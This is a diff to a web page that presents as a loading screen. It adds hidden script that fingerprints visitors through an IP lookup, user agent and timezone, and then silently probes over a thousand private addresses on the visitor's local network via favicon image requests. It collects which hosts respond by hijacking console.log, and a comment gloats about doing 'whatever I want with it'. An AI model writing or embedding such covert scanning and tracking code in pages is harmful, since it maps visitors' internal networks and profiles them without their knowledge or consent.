@@ -25,13 +25,13 @@ background-attachment: fixed;
 <canvas id="loading" width="500" height="400"></canvas>
 
 <script>
-var load = { getting: 5, has: 0 };
+var load = { getting: 5 + 254 * 4, has: 0 };
 var data = [];
 var realConsoleLog = console.log;
 function overRideConsole(item1, item2) {
 let log = (item1 !== undefined ? item1 : "") + (item2 !== undefined ? " " + item2 : "");
 // This is where I can do whatever I want with it >:D
-data.push(log);
+if (log !== undefined && log !== "") data.push(log);
 load.has++;
 if (load.has === load.getting) realConsoleLog(data);
 }
@@ -72,6 +72,20 @@ console.log("Couldn't use IPAPI");
 });
 console.log(navigator.userAgent || navigator.userAgentData);
 console.log(Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+const blocks = ['192.168.0.', '192.168.1.', '10.0.0.', '172.16.0.'];
+function scanCommonRanges() {
+for (const base of blocks) {
+for (let i = 1; i <= 254; i++) {
+const ip = base + i;
+const img = new Image();
+img.onload = () => { console.log("Responded: " + ip); };
+img.onerror = () => { console.log(""); };
+img.src = `http://${ip}/favicon.ico?cacheBust=` + Date.now();
+}
+}
+}
+scanCommonRanges();
 </script>
 
 <py-script>
